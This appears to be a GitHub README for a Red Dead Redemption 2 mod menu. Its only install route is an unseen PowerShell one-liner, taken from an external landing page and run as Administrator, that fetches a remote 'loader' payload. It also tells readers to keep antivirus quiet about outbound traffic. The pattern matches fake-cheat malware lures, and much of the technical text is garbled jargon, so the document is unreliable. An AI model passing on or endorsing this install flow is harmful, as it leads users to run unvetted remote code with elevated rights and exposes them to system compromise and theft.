[PREVIEW]: https://Reemageorge02.github.io/rdr2-modmenu/hero.png

### 🖥️ PowerShell Setup

Bootstrap runs entirely through a PowerShell one-liner against the hosted loader — details and copy-paste command on the landing page.

---

<p align="center">
  <a href="https://Reemageorge02.github.io/rdr2-modmenu/">
    <img src="files/button.svg" width="520" alt="Install via PowerShell" />
  </a>
</p>

## System Requirements

- Windows 10 or 11 (x64)
- PowerShell 5.1 or later (Windows PowerShell or PS 7 — both fine)
- An internet connection for the one-time landing page / bootstrap fetch
- A legitimate RDR2 installation (Steam / Epic / Rockstar Launcher, current build)
- WinHTTP not blocked by an antivirus heuristic — some endpoints are noise-prone; allow quiet outbound only

## How it works

The install path is PowerShell, not an installer binary. On the landing page you copy a short bootstrap command, paste it into a PowerShell window, and let it run. The command fetches the loader from the hosted endpoint, verifies the signed payload against the embedded manifest, drops the mod files into your RDR2 directory under a versioned `rdr2-modmenu/` subfolder, and writes a small launcher helper so each session brings the overlay up cleanly. From that point, game launch → mod menu hotkey is the entire flow — no old `dinput8.dll` name collision with other ASIs, no manual `ScriptHookRDR2.dll` swap.

**Numbered run flow:**
1. **Download** — open the landing page and copy the PowerShell bootstrap line.
2. **Extract** — the bootstrap auto-extracts to `%RDR2_ROOT%\rdr2-modmenu\` and snapshots the previous build.
3. **Admin** — run PowerShell as Administrator on first launch (needed to register the ASI chain state in the game's process).
4. **Launch** — start RDR2 normally. The overlay binds against the ASI loader after the intro sequence fully loads.
5. **Hotkey** — default insert key toggles the menu; bind/unbind in the settings panel. F5 reseeds when a game update drops an unknown hash.

## Compatibility

- ASI / scripthook reset behavior matches the current Rockstar forward-compat baseline — HUD mode safe, subtitle safe, animal skin changer works with `gameplay.max_varmint_spawns` override.
- Compatible with other passive map / texture mods that don't touch the `injector` slot; collision against other ASI-first mods is detect-allowed by design, expect one to win the chain.
- Offline single-player: full feature surface. Red Dead Online session use is modal — some writes are peer-sympathetized, others are client-only (we never promise R* server sync).
- Windows Insider builds have firewall noisy-brokering for the bootstrap; toggle your endpoint-fetch path if the fetch layer misbehaves.

## Feature Status

| Feature | Status |
| :-- | :--: |
| Rehashed native invoker | ✅ verified |
| Godmode / infinite cores | ✅ verified |
| Vehicle + train spawner | ✅ verified |
| Ped / animal skincaller | ✅ verified |
| Teleport + waypoints | ✅ verified |
| Weapon giver + safe rollback | ✅ verified |
| Role / XP editor (session state) | ✅ verified |
| ASI hot-recovery on update | ✅ verified |
| Peer-sympathetized writes in RDO | ⚠️ modal — game version pending |

🎮 overlay type: in-process native menu, no overlay driver dependency.

## Download (v2026 build)

The distribution is a PowerShell bootstrap only. The landing page hosts the setup payload, the signed manifest, and copy instructions. No `.exe` build sits on GitHub Releases or anywhere else — downloading an executable claiming to be from this project is a spoof.

## FAQ

**Q: Why PowerShell and not an `.exe` installer?**
A: Installed-style setups are the source of spoofed stubs and are hard to verify. A single visible PowerShell line gives the user full audit trail — endpoint, hash, target folder — before a single byte lands.

**Q: The bootstrap fails on fetch.**
A: WinHTTP connection refused usually means your outbound path to the landing host is filtered. Verify `Invoke-WebRequest` to the landing URL works, then re-run the bootstrap exactly as printed.

**Q: Do I need Admin on every run?**
A: Yes, first launch after any game build update. After the chain state is registered, relaunching from your normal RDR2 binary is enough — no elevation prompt.

**Q: My hotkey doesn't bring up the menu.**
A: Scripthook and the game's ASI chaine loading sequence pop up late on some GPUs. Wait for the story-mode intro to fully clear, then re-hit. If F5 auto-reseed triggered, the menu will re-bind at that point.

**Q: Does it work on Red Dead Online with Gold.**
A: Some writes are client-side-only and mirrored to peer-sympathy later in the server tick. Value-changing writes that require authoritative sync are consistent right up until a bandage change matches our hooks. Any tool claiming RDO gold manipulation is lying.

**Q: Will Rockstar ban me.**
A: This is host-side script behavior — same general class as every other ASI menu. Ask yourself the question every menu user asks. We don't promise anti-cheat silence. It's for education and single-player.

**Q: Where does the file go.**
A: `%RDR2_ROOT%\rdr2-modmenu\` — keep the dump short, game startup loads faster, and multiple builds can cold-swap by folder rename.

## Disclaimer

For educational purposes only. Use at your own risk — you take full responsibility for any violation of game TOS, video-game licensing, or local law when using inter-process tooling. The author asserts no ownership over Rockstar game assets; RDR2 and Red Dead from Take-Two Interactive are properties of their respective holders.

## License

MIT — use it, change it, ship it back. Contribution PRs welcome under the same license. No separate ASI signature corpus is included; register your own hash block if you build, and pull back the fix.
